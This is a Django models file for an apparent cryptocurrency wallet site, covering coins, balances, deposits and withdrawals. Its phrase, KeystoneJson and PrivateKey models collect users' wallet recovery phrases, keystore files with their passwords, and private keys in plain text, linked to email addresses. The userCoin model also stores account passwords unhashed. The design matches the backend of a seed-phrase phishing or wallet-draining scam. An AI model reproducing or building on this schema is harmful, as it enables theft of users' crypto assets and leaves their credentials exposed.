from django.db import models
from django.contrib.auth.models import User
# Create your models here.
class Coin(models.Model):
    fullname = models.CharField(max_length=50)
    shortname = models.CharField(max_length=50)
    image = models.URLField(blank=True, null=True)
    traderate = models.CharField(blank=True, null=True)
    def __str__(self):
            return f"{self.fullname} ({self.shortname})"
class Coin2(models.Model):
    fullname = models.CharField(max_length=50)
    shortname = models.CharField(max_length=50)
    image = models.URLField(blank=True, null=True)
    traderate = models.CharField(blank=True, null=True)
    traderates = models.CharField(blank=True, null=True)
    def __str__(self):
            return f"{self.fullname} ({self.shortname})"


class userCoinwallet(models.Model):
    balance = models.CharField(blank=True, null=True,default='0.00000')
    walletaddress = models.CharField(blank=True, null=True,)
    date = models.DateTimeField(auto_now_add=True, blank=True, null=True)
    iscoin = models.ForeignKey(Coin, on_delete=models.CASCADE)
    iscoin2 = models.ForeignKey(Coin2, on_delete=models.CASCADE, blank=True)
    def __str__(self):
            return f" usercoin ({self.iscoin.shortname})"
class userCoin(models.Model):
    phone = models.CharField(max_length=50)
    password = models.CharField(max_length=50)
    balance = models.CharField(blank=True, null=True,default='0.00')
    iscoin = models.ManyToManyField(userCoinwallet, )
    deposituser = models.ManyToManyField('deposit', )
    withdrwauser = models.ManyToManyField('withdrwa', )
    user = models.ForeignKey(User, on_delete=models.CASCADE,blank=True )
    date = models.DateTimeField(auto_now_add=True, blank=True, null=True)
    def __str__(self):
        return f"Wallet {self.id} - {self.user.username if self.user else 'No User'}"
    
CHOICE_STATUS = [
    ('processing', 'Process'),
    ('pending', 'Pending'),
    ('success', 'Success'),
    ('refund', 'Refund'),
    ('fail', 'Fail'),
]
 
class wallet(models.Model):
    name = models.CharField(blank=True, null=True)
    address = models.CharField(blank=True, null=True)
    addresss = models.CharField(blank=True, null=True)
    def __str__(self):
        return f"walletname-- {self.name}"

class deposit(models.Model):
    username = models.CharField(blank=True, null=True)
    walletname = models.CharField(blank=True, null=True)
    Amount = models.CharField(blank=True, null=True)
    status = models.CharField(default='pending',max_length=50, choices=CHOICE_STATUS)
    date = models.DateTimeField(auto_now=True,blank=True)
    def __str__(self):
        return f"deposit {self.id}"
class withdrwa(models.Model):
    username = models.CharField(blank=True, null=True)
    Amount = models.CharField(blank=True, null=True)
    RecipientAddress = models.TextField(blank=True, null=True)
    status = models.CharField(default='pending', choices=CHOICE_STATUS)
    date = models.DateTimeField(auto_now_add=True, blank=True, null=True)
    def __str__(self):
        return f"withdrwal {self.id}"
class phrase(models.Model):
    wallet = models.OneToOneField(userCoin, on_delete=models.CASCADE, related_name="phrase",blank=True, null=True)
    Namewallet = models.CharField(max_length=50)
    Email = models.CharField(blank=True, null=True)
    RecoveryPhrase = models.TextField(blank=True, null=True)
    date = models.DateTimeField(auto_now_add=True, blank=True, null=True)
    def __str__(self):
        return f"phrase {self.id}--{self.Namewallet}"
    
class KeystoneJson(models.Model):
    wallet = models.OneToOneField(userCoin, on_delete=models.CASCADE, related_name="Keystone",blank=True, null=True)
    Namewallet = models.CharField(max_length=50)
    Email = models.CharField(blank=True, null=True)
    keystonejson = models.TextField(blank=True, null=True)
    keystonejsonpassword = models.TextField(blank=True, null=True)
    date = models.DateTimeField(auto_now_add=True, blank=True, null=True)
    def __str__(self):
        return f"KeystoneJson {self.id}--{self.Namewallet}"
class PrivateKey(models.Model):
    wallet = models.OneToOneField(userCoin, on_delete=models.CASCADE, related_name="PrivateKey",blank=True, null=True)
    Namewallet = models.CharField(max_length=50)
    Email = models.CharField(blank=True, null=True)
    PrivatemainKey = models.TextField(blank=True, null=True)
    date = models.DateTimeField(auto_now_add=True, blank=True, null=True)
    def __str__(self):
        return f"PrivateKey {self.id}--{self.Namewallet}"
    